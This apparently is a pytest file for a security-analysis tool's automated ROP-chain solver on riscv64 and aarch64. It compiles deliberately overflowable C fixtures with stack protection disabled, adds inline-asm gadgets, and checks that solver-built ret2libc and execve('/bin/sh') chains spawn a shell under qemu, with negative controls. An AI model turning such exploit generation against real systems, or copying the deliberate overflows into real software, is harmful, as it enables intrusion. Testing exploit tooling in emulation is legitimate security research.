"""ROP-chain solver on LINK-REGISTER arches (riscv64, aarch64): where `ret`=`jr ra`/`ret x30` (no
stack pop), the chain is threaded through ra-restoring gadgets. rop_solver.solve_lr_chain composes a
LOADER (an epilogue that restores the callee-saved source/branch regs + the return register from the
overflow) feeding a `mv a0,sS; jr/br sB` CALLER -- set a0=&"/bin/sh", jump to `system` -> a REAL
shell. Confirmed under qemu-user with a negative control. The gadgets are DISCOVERED by the semantic
engine (gadget_emu), so the solver composes from the target's actual gadgets, not a fixed shape.

system("/bin/sh") is one-argument, so it sidesteps the a1/a2 (argv/envp) gadget-scarcity wall that
blocks the multi-register execve-syscall chain on these arches."""
import shutil
import subprocess

import pytest
from lykos.analyze.poc import attribution, exploit, gadget_emu, rop, rop_solver
from lykos.analyze.poc import exploit_stage as es
from lykos.analyze.poc.capture import make_qemu_capture
from lykos.analyze.poc import primitive

_SRC = (
    '#include <unistd.h>\n#include <stdlib.h>\n'
    'char binsh[] = "/bin/sh";\n'
    'void vuln(void){ char b[64]; read(0,b,512); }\n'
    'int main(void){ if(getpid()==-1) system(binsh); vuln(); return 0; }\n')


def _run(arch, gcc, qemu, tmp_path):
    if not (gcc and qemu and gadget_emu.available()):
        pytest.skip(f"needs {arch} toolchain + qemu + unicorn/capstone")
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([gcc, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip(f"cannot build {arch} fixture")
    data = exe.read_bytes()
    system = (exploit.elf_functions(data).get("system")
              or rop.libc_symbols(data, ("system",)).get("system"))
    binsh = rop.find_string(data, b"/bin/sh")
    assert system and binsh

    cap = make_qemu_capture(exe, arch, "stdin", [], 12, endianness="little", bits=64)
    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300,
                                      endian="little", word=8)
    offset = rec[0] if rec else 72

    # THE SOLVER: given only {a0=&"/bin/sh", target=system} it discovers the loader+caller gadgets
    # and composes the ra-threaded chain candidates.
    cands = rop_solver.solve_lr_chain(data, arch, set_a0=binsh, call_va=system, offset=offset)
    assert cands, f"solver composed no {arch} chain"

    hit = None
    for c in cands:
        m = attribution.make_code_markers()
        if m.proves(es._qemu_shell_detonate(exe, arch, "little", 64, c["payload"], m, 12.0)):
            hit = c
            break
    assert hit, f"no solver-composed {arch} chain spawned a shell"

    # negative control: a wrong &"/bin/sh" (same loader/caller/position) must NOT spawn a shell
    neg = rop_solver.solve_lr_chain(data, arch, set_a0=binsh ^ 0xFFFF, call_va=system, offset=offset)
    nc = next((c for c in neg if (c["loader"], c["caller"], c["stack_pos"])
               == (hit["loader"], hit["caller"], hit["stack_pos"])), None)
    assert nc is not None
    m2 = attribution.make_code_markers()
    assert not m2.proves(es._qemu_shell_detonate(exe, arch, "little", 64, nc["payload"], m2, 12.0))


_RV_GCC = shutil.which("riscv64-linux-gnu-gcc")
_RV_QEMU = shutil.which("qemu-riscv64") or shutil.which("qemu-riscv64-static")
_AA_GCC = shutil.which("aarch64-linux-gnu-gcc")
_AA_QEMU = shutil.which("qemu-aarch64") or shutil.which("qemu-aarch64-static")


def test_lr_solver_system_shell_riscv64(tmp_path):
    _run("riscv64", _RV_GCC, _RV_QEMU, tmp_path)


def test_lr_solver_system_shell_aarch64(tmp_path):
    _run("aarch64", _AA_GCC, _AA_QEMU, tmp_path)


def _run_stage(arch, gcc, qemu, store, tmp_path):
    """The build_exploit STAGE files a solver-composed L3 for a link-register target. strategy=
    "rop" is the isolator: the byte-pattern cross-arch ret2libc clauses are gated `strategy==
    "auto"`, so under "rop" the ONLY cross-arch clause that can fire is the semantic-solver
    fallback (_lr_solver_ret2libc_exploit). A verified L3 under that strategy therefore PROVES the
    solver path composed, confirmed (shell + a0-corrupting negative control) and filed it through
    the shared drive_cross_ret2libc tail -- the exact wiring the autopilot drives under "auto"."""
    if not (gcc and qemu and gadget_emu.available()):
        pytest.skip(f"needs {arch} toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([gcc, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip(f"cannot build {arch} fixture")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("lrsolv").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        assert (store.targets.get(t.id).mitigations or {}).get("nx") != "off"   # NX on (ret2libc)
        run = enqueue_exploit(q, t, params={"strategy": "rop", "timeout": 12})
        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, f"the build_exploit stage filed no solver-composed L3 for {arch}"
    # provenance: the finding must be the SOLVER's (dedup_key slug ends in -solver), proving the
    # fallback -- not some other clause -- filed it.
    row = store.conn.execute(
        "SELECT title FROM finding WHERE target_id=? AND dedup_key LIKE ?",
        (t.id, "exploit:%-solver:%")).fetchone()
    assert row is not None, "L3 was filed but not via the semantic-solver fallback"
    assert "solver" in (row["title"] or "").lower()


def test_lr_solver_stage_files_l3_riscv64(store, tmp_path):
    _run_stage("riscv64", _RV_GCC, _RV_QEMU, store, tmp_path)


def test_lr_solver_stage_files_l3_aarch64(store, tmp_path):
    _run_stage("aarch64", _AA_GCC, _AA_QEMU, store, tmp_path)


# A fixture that keeps values live across the overflowing read(), forcing callee-saved usage (the
# registers the ret2libc gadgets need the overflow to control); system + "/bin/sh" stay in the static
# image but off the pre-overflow path. This is the SAME source the pattern-path cross-arch test
# (test_ret2libc_cross) drives to a confirmed shell under "auto", so phase A below is guaranteed to
# compose on the natural libc gadgets.
_SRC_ORD = (
    '#include <stdlib.h>\n#include <unistd.h>\n'
    'void never(int c,char**v){ if(c>99){ char*s="/bin/sh"; system(s); } }\n'
    'long sink(long x){ volatile long v=x; return v*2654435761UL + 1; }\n'
    'void vuln(long s){\n'
    '    char buf[64];\n'
    '    long a=sink(s), b=sink(s^0x55), c=sink(s^0xAA);\n'
    '    read(0, buf, 512);\n'
    '    sink(a); sink(b); sink(c);\n'
    '}\n'
    'int main(int argc,char**argv){ never(argc,argv); vuln(argc); write(1,"ok\\n",3); return 0; }\n')


def _stage_auto_target(store, exe, name):
    """Ingest a copy of `exe` and drive build_exploit under strategy="auto"; return the target."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create(name).id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        assert (store.targets.get(t.id).mitigations or {}).get("nx") != "off"   # NX on, no PIE
        run = enqueue_exploit(q, t, params={"strategy": "auto", "timeout": 12})
        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    return t


def _run_auto_ordering(arch, gcc, qemu, store, tmp_path, monkeypatch):
    """FALLBACK ORDERING under strategy="auto": the semantic solver is a FALLBACK the pattern path
    pre-empts, not a path that runs unconditionally. Proven on ONE binary, two phases:

      A (unpatched): the byte-pattern ret2libc clause composes on the natural libc gadgets and,
        running FIRST, files the L3 -- the solver clause never runs (pattern slug present, solver
        slug ABSENT).
      B (pattern finder neutered to empty -- exactly what a target with non-canonical loader/caller
        encodings yields): the "auto" path falls THROUGH the declining pattern clause to the solver
        fallback, which composes from the real binary by emulation and files the L3 (solver slug
        present).

    The monkeypatch touches only the byte-DECODER (rop.find_<arch>_r2libc_gadgets); the solver reaches
    its gadgets through gadget_emu, so phase B's chain is still discovered in the real binary -- the
    patch only removes the pattern path's ability to compose, which is the fallback's trigger."""
    if not (gcc and qemu and gadget_emu.available()):
        pytest.skip(f"needs {arch} toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.db.dao import FindingDAO
    src = tmp_path / "v.c"
    src.write_text(_SRC_ORD)
    exe = tmp_path / "v"
    if subprocess.run([gcc, "-O1", "-fno-stack-protector", "-U_FORTIFY_SOURCE", "-D_FORTIFY_SOURCE=0",
                       "-no-pie", "-static", "-w", str(src), "-o", str(exe)],
                      capture_output=True).returncode:
        pytest.skip(f"cannot build {arch} ordering fixture")
    register()
    pattern_slug, solver_slug = f"{arch}-ret2libc", f"{arch}-ret2libc-solver"
    fda = FindingDAO(store.conn)

    # PHASE A -- pattern path wins (and the solver does NOT pre-empt it).
    ta = _stage_auto_target(store, exe, "ordA")
    assert fda.id_for_dedup(ta.id, f"exploit:{pattern_slug}:{ta.id}"), \
        f"{arch}: the pattern ret2libc path did not win under auto"
    assert not fda.id_for_dedup(ta.id, f"exploit:{solver_slug}:{ta.id}"), \
        f"{arch}: the solver pre-empted the pattern path -- fallback ordering is wrong"

    # PHASE B -- pattern finder returns nothing; the auto path must fall through to the solver.
    monkeypatch.setattr(rop, f"find_{arch}_r2libc_gadgets",
                        lambda data: {"callers": [], "loaders": []})
    tb = _stage_auto_target(store, exe, "ordB")
    assert fda.id_for_dedup(tb.id, f"exploit:{solver_slug}:{tb.id}"), \
        f"{arch}: the solver fallback did not engage under auto when the pattern path declined"


def test_auto_fallback_ordering_riscv64(store, tmp_path, monkeypatch):
    _run_auto_ordering("riscv64", _RV_GCC, _RV_QEMU, store, tmp_path, monkeypatch)


def test_auto_fallback_ordering_aarch64(store, tmp_path, monkeypatch):
    _run_auto_ordering("aarch64", _AA_GCC, _AA_QEMU, store, tmp_path, monkeypatch)


# ---- MULTI-REGISTER execve-syscall (solve_lr_execve_chain) ---------------------------------------
# aarch64 execve needs a0=&"/bin/sh", a1=0, a2=0 and libc's `mov x8,#221; svc` gateway. x1/x2 are
# CALLER-saved, so a clean ret-terminated loader that sets them from the stack does not occur in stock
# glibc (and the sound engine rejects the `ldp x1,x2` sequences that carry an svc/str in their body) --
# which is why the solver honestly declines there. This fixture SUPPLIES clean arg-zeroing + value-
# loader + caller gadgets by inline asm (as tests/test_rop_solver.py supplies x86 pop-gadgets), so the
# solver's multi-register composition can be proven end to end where the gadgets exist.
_ASM_EXECVE_AA = (
    '#include <unistd.h>\n'
    'char binsh[] = "/bin/sh";\n'
    '__asm__(".text\\n"\n'
    ' ".global g_argz\\n g_argz: ldp x1,x2,[sp,#16]\\n ldp x29,x30,[sp],#32\\n ret\\n"\n'   # L0
    ' ".global g_load\\n g_load: ldp x19,x20,[sp,#16]\\n ldp x29,x30,[sp],#32\\n ret\\n"\n'  # LB
    ' ".global g_call\\n g_call: mov x0,x19\\n br x20\\n"\n'                                  # caller
    ' ".global g_exec\\n g_exec: mov x8,#221\\n svc #0\\n");\n'                               # gateway
    'void vuln(void){ char b[64]; read(0,b,512); }\n'
    'int main(void){ vuln(); return 0; }\n')


def test_lr_execve_solver_shell_aarch64(tmp_path):
    """solve_lr_execve_chain composes execve("/bin/sh",0,0) on aarch64 -- LB (stage sS=&binsh,
    sB=gateway) -> L0 (zero a1=a2=0 LAST) -> caller (mov a0,sS; jr sB) -- and spawns a REAL shell under
    qemu, with a negative control (wrong &binsh). No `system` symbol. Multi-register, so the engine's
    survival guarantees matter: the caller is certified to preserve a1/a2 and L0 to preserve the
    callee-saved sS/sB, and every effect is verified across seedings with no control-flow in a body."""
    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_AA)
    exe = tmp_path / "v"
    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build aarch64 execve fixture")
    data = exe.read_bytes()
    binsh = rop.find_string(data, b"/bin/sh")
    gateway = rop.find_aarch64_execve_site(data)
    assert binsh and gateway
    cap = make_qemu_capture(exe, "aarch64", "stdin", [], 12, endianness="little", bits=64)
    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300, endian="little", word=8)
    offset = rec[0] if rec else 72
    cands = rop_solver.solve_lr_execve_chain(data, "aarch64", binsh=binsh, gateway=gateway,
                                             offset=offset)
    assert cands, "solver composed no aarch64 execve chain"
    hit = None
    for c in cands:
        m = attribution.make_code_markers()
        if m.proves(es._qemu_shell_detonate(exe, "aarch64", "little", 64, c["payload"], m, 12.0)):
            hit = c
            break
    assert hit, "no solver-composed aarch64 execve chain spawned a shell"
    neg = rop_solver.solve_lr_execve_chain(data, "aarch64", binsh=binsh ^ 0xFFFF, gateway=gateway,
                                           offset=offset)
    nc = next((c for c in neg if (c["l0"], c["lb"], c["caller"], c["base"])
               == (hit["l0"], hit["lb"], hit["caller"], hit["base"])), None)
    assert nc is not None
    m2 = attribution.make_code_markers()
    assert not m2.proves(es._qemu_shell_detonate(exe, "aarch64", "little", 64, nc["payload"], m2, 12.0))


def test_lr_execve_solver_riscv64_declines(tmp_path):
    """HONEST CEILING: on riscv64 the execve-syscall chain needs a2(envp)=0 in a ra-restoring gadget,
    and the sound engine finds none (a2 is reachable only as a2<-a0), so solve_lr_execve_chain returns
    [] -- the a2/envp wall, PROVEN by emulation rather than asserted. The gateway address is immaterial
    here: the decline is at the arg-zeroing-loader step, before any gateway is used."""
    if not (_RV_GCC and gadget_emu.available()):
        pytest.skip("needs riscv64 toolchain + unicorn/capstone")
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build riscv64 fixture")
    data = exe.read_bytes()
    binsh = rop.find_string(data, b"/bin/sh")
    cands = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh, gateway=binsh, offset=72)
    assert cands == [], "riscv64 execve unexpectedly composed -- the a2/envp wall should block it"


def test_lr_execve_solver_stage_files_l3_aarch64(store, tmp_path, monkeypatch):
    """The build_exploit STAGE files the solver-composed execve L3 on aarch64. strategy="execve" runs
    the execve paths; monkeypatching the byte-pattern loader finder to empty makes the PATTERN execve
    path decline, so the ONLY clause that can file is the semantic execve solver -- proving the wiring
    end to end (compose -> reach the svc with x0=&"/bin/sh" AND x1=x2=0 + a negative control -> L3)."""
    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import FindingDAO, PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_AA)
    exe = tmp_path / "v"
    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build aarch64 execve fixture")
    # neuter the byte-pattern loader finder so the PATTERN execve path declines -> isolates the solver
    monkeypatch.setattr(rop, "find_aarch64_r2libc_gadgets",
                        lambda data: {"callers": [], "loaders": []})
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("lrexec").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        run = enqueue_exploit(q, t, params={"strategy": "execve", "timeout": 14})
        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, "the stage filed no solver-composed aarch64 execve L3"
    fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:aarch64-execve-syscall-solver:{t.id}")
    assert fid, "L3 filed but not via the execve semantic solver"


def test_auto_execve_solver_fallback_aarch64(store, tmp_path, monkeypatch):
    """FALLBACK ORDERING for the execve solver under strategy="auto" -- it is a fallback the pattern
    execve path pre-empts, not an always-on clause. ONE binary (the inline-asm fixture: NO `system`
    symbol so both ret2libc paths decline, clean arg-zero/loader/caller gadgets + a svc gateway), two
    phases:
      A (unpatched): the pattern execve path composes on the clean gadgets and files the L3 FIRST --
        pattern slug present, solver slug ABSENT (the solver did not pre-empt).
      B (the byte-pattern loader finder neutered -> pattern ret2libc AND pattern execve both decline;
        no `system`, so neither ret2libc path fires): the auto path falls through to the execve SOLVER,
        which composes via gadget_emu and files the L3 -- solver slug present.
    Proves solve_lr_execve_chain is reachable under "auto" as a genuine fallback."""
    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.db.dao import FindingDAO
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_AA)
    exe = tmp_path / "v"
    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build aarch64 execve fixture")
    register()
    fda = FindingDAO(store.conn)
    pat, sol = "aarch64-execve-syscall", "aarch64-execve-syscall-solver"

    # PHASE A -- the pattern execve path wins under auto (and the solver does NOT pre-empt it).
    ta = _stage_auto_target(store, exe, "aevA")
    assert fda.id_for_dedup(ta.id, f"exploit:{pat}:{ta.id}"), \
        "the pattern execve path did not win under auto"
    assert not fda.id_for_dedup(ta.id, f"exploit:{sol}:{ta.id}"), \
        "the execve solver pre-empted the pattern path -- fallback ordering is wrong"

    # PHASE B -- byte-pattern loader finder neutered; auto must fall through to the execve solver.
    monkeypatch.setattr(rop, "find_aarch64_r2libc_gadgets",
                        lambda data: {"callers": [], "loaders": []})
    tb = _stage_auto_target(store, exe, "aevB")
    assert fda.id_for_dedup(tb.id, f"exploit:{sol}:{tb.id}"), \
        "the execve solver did not engage under auto when the pattern path declined"


def test_autopilot_files_execve_solver_l3_aarch64(store, tmp_path, monkeypatch):
    """END-TO-END through the REAL autopilot: run_case_autopilot triages the target then drives
    build_exploit(strategy="auto") in its recover phase. On an aarch64 no-`system` target whose
    byte-pattern loaders are absent (monkeypatched empty, = a non-canonical target), the auto path
    reaches the semantic execve SOLVER, which composes execve("/bin/sh",0,0) and files the verified L3.
    This is the FULL pipeline (triage -> recover -> build_exploit -> solver -> confirm -> file), not a
    bare enqueue_exploit. The heavy campaigns are skipped so the run is fast; build_exploit runs early
    in the recover phase and is unaffected by the skips."""
    import threading
    if not (_AA_GCC and _AA_QEMU and gadget_emu.available()):
        pytest.skip("needs aarch64 toolchain + qemu + unicorn/capstone")
    from lykos.analyze import orchestrate as O
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.db.dao import FindingDAO, PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_AA)
    exe = tmp_path / "v"
    if subprocess.run([_AA_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build aarch64 execve fixture")
    register()
    case = store.cases.create("evauto")
    t = ingest(store, case.id, exe, filename="v")
    # Non-canonical target: no byte-pattern loaders, so the pattern ret2libc/execve clauses decline and
    # (with no `system`) neither ret2libc path fires -- the auto path must reach the execve solver. The
    # autopilot runs in-process, so this process-global patch reaches its build_exploit stage.
    monkeypatch.setattr(rop, "find_aarch64_r2libc_gadgets",
                        lambda data: {"callers": [], "loaders": []})
    # The autopilot ENQUEUES stages to the case JobQueue; a WorkerPool on the same DB executes them
    # (exactly how cli.py / the API drive it). Without a running pool every stage just waits out its
    # slice. build_exploit(auto) runs FIRST, in the recover phase, and files the L3 there; skip the
    # rest so the end-to-end run is fast and build_exploit gets an ample slice.
    skip = ["behavior_trace", "boundary_fuzz", "build_poc", "chain_primitive", "concolic",
            "coverage_fuzz", "cve_corroborate", "cve_poc", "cve_scan", "debug_monitor", "detect_cwe",
            "directed_fuzz", "disassemble", "dynamic_run", "dynamic_taint", "embedded_audit",
            "env_fuzz", "extract_secrets", "firmware_carve", "firmware_rehost", "fuzz",
            "int_overflow_scan", "libfuzzer", "mem_oracle", "multi_debug", "net_fuzz",
            "poc_primitive", "root_cause", "source_cve_scan", "source_sink_scan",
            "synthesize_injection", "synthesize_poc", "synthesize_secret", "uaf_scan", "unpack",
            "heap_check", "heap_trace", "oob_index"]
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    status: dict = {}
    try:
        enqueue_triage(JobQueue(store.conn), t, force=True)      # triage first, as cli.py does
        assert pool.wait_idle(180)
        O.run_case_autopilot(store.dir, case.id, [t.id], status, threading.Event(),
                             budget_seconds=300, skip_stages=skip)
    finally:
        pool.stop(grace=3.0)
    assert status.get("state") == "done"
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, "the autopilot filed no verified L3"
    fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:aarch64-execve-syscall-solver:{t.id}")
    assert fid, "the autopilot's L3 was not filed by the execve semantic solver"


# ---- riscv64 execve-syscall (now that find_riscv64_execve_site exists) ---------------------------
# The riscv execve gateway `li a7,221; ecall` + clean arg-zero/value-loader/caller gadgets, supplied by
# inline asm (stock riscv glibc has neither a findable gateway nor a clean a2/envp-zeroing epilogue --
# a2 is caller-saved and reachable only as a2<-a0 -- so the solver honestly declines there).
_ASM_EXECVE_RV = (
    '#include <unistd.h>\n'
    'char binsh[] = "/bin/sh";\n'
    '__asm__(".text\\n"\n'
    ' ".global g_argz\\n g_argz: ld a1,16(sp)\\n ld a2,24(sp)\\n ld ra,8(sp)\\n addi sp,sp,32\\n ret\\n"\n'   # L0
    ' ".global g_load\\n g_load: ld s0,16(sp)\\n ld s1,24(sp)\\n ld ra,8(sp)\\n addi sp,sp,32\\n ret\\n"\n'   # LB
    ' ".global g_call\\n g_call: mv a0,s0\\n jr s1\\n"\n'                                                     # caller
    ' ".global g_exec\\n g_exec: li a7,221\\n ecall\\n");\n'                                                  # gateway
    'void vuln(void){ char b[64]; read(0,b,512); }\n'
    'int main(void){ vuln(); return 0; }\n')


def test_find_riscv64_execve_site():
    """find_riscv64_execve_site returns the `li a7,221` va of a `li a7,221; ecall` pair (the riscv
    execve thunk), searched at 2-byte alignment past compressed padding."""
    seg = ((0x00000013).to_bytes(4, "little")             # nop (addi x0,x0,0) padding
           + (0x0DD00893).to_bytes(4, "little")           # li a7,221 (addi a7,x0,221)
           + (0x00000073).to_bytes(4, "little"))          # ecall
    orig = rop._loads
    rop._loads = lambda data: [(0, len(seg), 0x11000, 1)]
    try:
        assert rop.find_riscv64_execve_site(seg) == 0x11000 + 4    # the li, not the ecall
    finally:
        rop._loads = orig


def test_lr_execve_solver_shell_riscv64(tmp_path):
    """solve_lr_execve_chain composes execve("/bin/sh",0,0) on riscv64 and spawns a REAL shell under
    qemu + a negative control -- the multi-register chain reaching `li a7,221; ecall` with a0=&binsh,
    a1=a2=0. The clean arg-zeroing loader comes from inline asm (stock glibc has none), proving the
    riscv wiring composes WHERE THE GADGETS EXIST; on stock glibc it declines (the a2/envp wall)."""
    if not (_RV_GCC and _RV_QEMU and gadget_emu.available()):
        pytest.skip("needs riscv64 toolchain + qemu + unicorn/capstone")
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_RV)
    exe = tmp_path / "v"
    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build riscv64 execve fixture")
    data = exe.read_bytes()
    binsh = rop.find_string(data, b"/bin/sh")
    gateway = rop.find_riscv64_execve_site(data)
    assert binsh and gateway
    cap = make_qemu_capture(exe, "riscv64", "stdin", [], 12, endianness="little", bits=64)
    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300, endian="little", word=8)
    offset = rec[0] if rec else 72
    cands = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh, gateway=gateway,
                                             offset=offset)
    assert cands, "solver composed no riscv64 execve chain"
    hit = None
    for c in cands:
        m = attribution.make_code_markers()
        if m.proves(es._qemu_shell_detonate(exe, "riscv64", "little", 64, c["payload"], m, 12.0)):
            hit = c
            break
    assert hit, "no solver-composed riscv64 execve chain spawned a shell"
    neg = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh ^ 0xFFFF, gateway=gateway,
                                           offset=offset)
    nc = next((c for c in neg if (c["l0"], c["lb"], c["caller"], c["base"])
               == (hit["l0"], hit["lb"], hit["caller"], hit["base"])), None)
    assert nc is not None
    m2 = attribution.make_code_markers()
    assert not m2.proves(es._qemu_shell_detonate(exe, "riscv64", "little", 64, nc["payload"], m2, 12.0))


def test_lr_execve_solver_stage_files_l3_riscv64(store, tmp_path):
    """The build_exploit STAGE files the solver-composed execve L3 on riscv64. strategy="execve"
    isolates it: riscv has no pattern execve clause, and with no `system` the ret2libc paths decline,
    so the ONLY execve clause that can fire is the semantic solver -- proving the riscv wiring end to
    end (compose -> reach `li a7,221; ecall` with a0=&"/bin/sh", a1=a2=0 + a negative control -> L3)."""
    if not (_RV_GCC and _RV_QEMU and gadget_emu.available()):
        pytest.skip("needs riscv64 toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import FindingDAO, PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(_ASM_EXECVE_RV)
    exe = tmp_path / "v"
    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build riscv64 execve fixture")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("rvexec").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        run = enqueue_exploit(q, t, params={"strategy": "execve", "timeout": 14})
        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, "the stage filed no solver-composed riscv64 execve L3"
    fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:riscv64-execve-syscall-solver:{t.id}")
    assert fid, "L3 filed but not via the riscv64 execve semantic solver"
